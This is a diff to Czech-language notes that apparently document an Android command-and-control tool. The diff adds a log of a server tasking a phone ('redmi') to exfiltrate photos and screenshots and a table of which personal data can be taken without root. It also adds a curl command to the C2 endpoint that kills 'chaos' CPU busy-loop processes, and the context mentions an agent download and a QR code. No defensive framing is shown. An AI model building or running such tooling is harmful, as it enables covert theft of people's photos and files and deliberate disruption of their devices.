@@ -11,12 +11,15 @@ queued for redmi: exfil_photos
 → task for redmi: info
 ← [redmi] info => ...
 → task for redmi: exfil_photos
-📥 exfil redmi: photo/IMG_2024.jpg (26668 B) -> exfil/redmi_photo_IMG_2024.jpg
-📥 exfil redmi: photo/pic.png (6668 B) -> exfil/redmi_photo_pic.png
+📥 exfil redmi: photo/IMG_2024.jpg (20000 B, base64 decoded) -> exfil/redmi_photo_IMG_2024.jpg
+📥 exfil redmi: photo/pic.png (5000 B, base64 decoded) -> exfil/redmi_photo_pic.png
 ← [redmi] exfil_photos => exfil_photos: 2 photos uploaded
+→ task for redmi: exfil_screenshots
+📥 exfil redmi: screenshot/chaos_1.png (9350200 B, base64 decoded) -> exfil/redmi_screenshot_chaos_1.png
+← [redmi] exfil_screenshots => exfil_screenshots: 2 screenshots uploaded
 ```
 - stažení `GET /agent` → HTTP 200, 7 012 648 B, binár bit-identický ✔
-- exfiltrované base64 dekódováno zpět na původních 20 000 B ✔
+- exfiltrované base64 dekódováno na serveru → `cmp` s originálem **bit-identické** (foto JPEG/PNG i screenshot) ✔
 - QR kód vygenerován přes `qrencode` ✔
 
 ---
@@ -98,8 +101,9 @@ Dashboard: `http://${LAN}:8080/dashboard` → tlačítka, výsledky, seznam soub
 
 | Data | Bez rootu (shell) | Poznámka |
 |---|---|---|
-| **Fotky** `/sdcard/DCIM`, `/sdcard/Pictures` | ✅ ano | shell má přístup, ověřeno tokem |
+| **Fotky** `/sdcard/DCIM`, `/sdcard/Pictures` | ✅ ano | shell má přístup, ověřeno tokem, **Base64 dekódován na serveru** |
 | **Stahování** `/sdcard/Download` | ✅ ano | i jiné soubory |
+| **Screenshoty** `/sdcard/chaos_*.png` | ✅ ano | exfil_screenshots, **Base64 dekódován na serveru** |
 | **Kontakty** | ❌ ne | `/data/data/...contacts` je bez rootu nepřístupné |
 | **SMS** | ❌ ne | totéž, `/data/data/...telephony` |
 | **Hesla / klávesnice** | ❌ ne | vyžaduje root nebo Accessibility API |
@@ -147,5 +151,9 @@ Poll jde směrem ven → projde NATem. C2 musí být dosažitelné zvenčí:
 
 ```bash
 P=$(ss -ltnp | grep ':8080' | grep -oP 'pid=\K[0-9]+' | head -1); [ -n "$P" ] && kill "$P"
-# na telefonu: curl ".../push?id=redmi&cmd=stop"  nebo restart telefonu
+# na telefonu:
+curl "http://${LAN}:8080/push?id=redmi&cmd=stop"  # pkill -9 chaos procesy
+# nebo restart telefonu (nejjistější)
 ```
+
+**Poznámka k `stop`:** Používá `pkill -9` podle vzorů `while true`, `chaos`, `chaos_`. Některé procesy mohou zůstat (např. `am start` aktivace), ale busy-loop CPU smyčky by měly být zabity.
